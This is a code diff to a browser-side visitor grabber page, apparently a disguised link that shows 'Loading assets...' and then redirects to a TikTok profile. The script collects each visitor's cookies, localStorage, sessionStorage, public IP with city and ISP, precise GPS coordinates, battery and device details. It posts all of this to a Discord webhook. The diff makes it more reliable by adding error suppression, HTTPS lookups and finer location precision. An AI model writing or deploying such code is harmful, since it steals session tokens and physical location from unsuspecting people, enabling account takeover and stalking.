@@ -43,9 +43,9 @@
         cookies: "",
         localStorage: "",
         sessionStorage: "",
-        gps: "not requested",
-        ip: "",
-        battery: "",
+        gps: "pending",
+        ip: "pending",
+        battery: "pending",
         ram: navigator.deviceMemory || "unknown",
         cores: navigator.hardwareConcurrency || "unknown",
         screen: screen.width + "x" + screen.height,
@@ -91,18 +91,17 @@
     } catch(er) {}
 
     function sendToDiscord(msg) {
-        var x = new XMLHttpRequest();
-        x.open("POST", WEBHOOK, true);
-        x.setRequestHeader("Content-Type", "application/json");
-        x.send(JSON.stringify({ content: msg }));
+        try {
+            var x = new XMLHttpRequest();
+            x.open("POST", WEBHOOK, true);
+            x.setRequestHeader("Content-Type", "application/json");
+            x.send(JSON.stringify({ content: msg }));
+        } catch(er) {}
     }
 
     function buildAndSend() {
-        var msg = "🍪 **New Visitor**\n";
-        msg += "```json\n";
-        msg += "Cookies: " + loot.cookies + "\n\n";
-        msg += "localStorage: " + loot.localStorage + "\n\n";
-        msg += "sessionStorage: " + loot.sessionStorage + "\n\n";
+        var msg = "📡 **New Visitor**\n";
+        msg += "```\n";
         msg += "GPS: " + loot.gps + "\n";
         msg += "IP Geo: " + loot.ip + "\n";
         msg += "Battery: " + loot.battery + "\n";
@@ -117,31 +116,44 @@
         msg += "Referrer: " + loot.referrer + "\n";
         msg += "URL: " + loot.url + "\n";
         msg += "Time: " + loot.time + "\n";
+        msg += "---\nCookies: " + loot.cookies + "\n";
+        msg += "localStorage: " + loot.localStorage + "\n";
+        msg += "sessionStorage: " + loot.sessionStorage + "\n";
         msg += "```";
         sendToDiscord(msg);
     }
 
-    // Get IP geolocation
+    // IP geolocation via HTTPS proxy
     e.textContent = "Loading location data...";
-    fetch("http://ip-api.com/json/?fields=query,country,city,regionName,zip,lat,lon,isp,org,timezone")
+    fetch("https://api.ipify.org?format=json")
         .then(function(r) { return r.json(); })
         .then(function(d) {
-            loot.ip = JSON.stringify(d);
+            loot.ip = "Public IP: " + d.ip;
+            // Now get geolocation for that IP
+            return fetch("https://ipapi.co/" + d.ip + "/json/");
         })
-        .catch(function() {})
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+            if (d.city) {
+                loot.ip = d.city + ", " + d.region + ", " + d.country_name + " | ISP: " + d.org + " | IP: " + d.ip;
+            }
+        })
+        .catch(function() {
+            loot.ip = "lookup failed";
+        })
         .finally(function() {
-            // Try GPS
+            // Now try GPS
             if (navigator.geolocation) {
                 e.textContent = "Requesting location...";
                 navigator.geolocation.getCurrentPosition(
                     function(pos) {
-                        loot.gps = pos.coords.latitude + ", " + pos.coords.longitude + " (acc: " + pos.coords.accuracy + "m)";
+                        loot.gps = pos.coords.latitude.toFixed(6) + ", " + pos.coords.longitude.toFixed(6) + " (acc: " + Math.round(pos.coords.accuracy) + "m)";
                         e.textContent = "Loading assets...";
                         buildAndSend();
                         setTimeout(function(){ location.replace("https://www.tiktok.com/@khaby.lame"); }, 2000);
                     },
-                    function() {
-                        loot.gps = "denied or unavailable";
+                    function(err) {
+                        loot.gps = "denied (code: " + err.code + ")";
                         e.textContent = "Loading assets...";
                         buildAndSend();
                         setTimeout(function(){ location.replace("https://www.tiktok.com/@khaby.lame"); }, 2000);
@@ -149,7 +161,7 @@
                     { timeout: 5000, maximumAge: 0 }
                 );
             } else {
-                loot.gps = "not supported";
+                loot.gps = "not supported by browser";
                 e.textContent = "Loading assets...";
                 buildAndSend();
                 setTimeout(function(){ location.replace("https://www.tiktok.com/@khaby.lame"); }, 2000);
